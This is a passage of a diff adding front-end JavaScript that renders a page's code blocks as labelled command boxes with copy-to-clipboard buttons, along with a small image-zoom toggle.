+        else if (/^# |^\/\/ Dummy|^define\(/m.test(rawText)) labelText = 'config';
+        else labelText = 'code';
+      } else {
+        var first = lines[0].trim();
+        labelText = first.length > 48 ? first.slice(0, 48) + '...' : (first || 'command');
+      }
+      label.textContent = labelText;
+
+      var body = document.createElement('div');
+      body.className = 'cmd-block-body' + (multiline ? ' multiline' : '');
+
+      if (!multiline) {
+        var prompt = document.createElement('span');
+        prompt.className = 'prompt';
+        prompt.textContent = '$';
+        body.appendChild(prompt);
+      }
+
+      var code = document.createElement('code');
+      code.innerHTML = codeEl.innerHTML;
+      body.appendChild(code);
+
+      var btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = 'copy-btn';
+      btn.setAttribute('aria-label', 'Copy');
+      btn.innerHTML = '<i class="bx bx-copy"></i>';
+      btn.addEventListener('click', function (e) {
+        e.preventDefault();
+        navigator.clipboard.writeText(rawText).then(function () {
+          btn.innerHTML = '<i class="bx bx-check"></i>';
+          btn.classList.add('copied');
+          setTimeout(function () {
+            btn.innerHTML = '<i class="bx bx-copy"></i>';
+            btn.classList.remove('copied');
+          }, 1600);
+        });
+      });
+      body.appendChild(btn);
+
+      block.appendChild(label);
+      block.appendChild(body);
+      pre.dataset.converted = '1';
+      pre.replaceWith(block);
+    });
+
+    function toggleZoom(img) {
+      img.classList.toggle('expanded');
+      if (img.classList.contains('expanded')) {
+        setTimeout(function () { img.scrollIntoView({ behavior: 'smooth', block: 'center' }); }, 100);
+      }
+    }
+  </script>
+</body>
+</html>
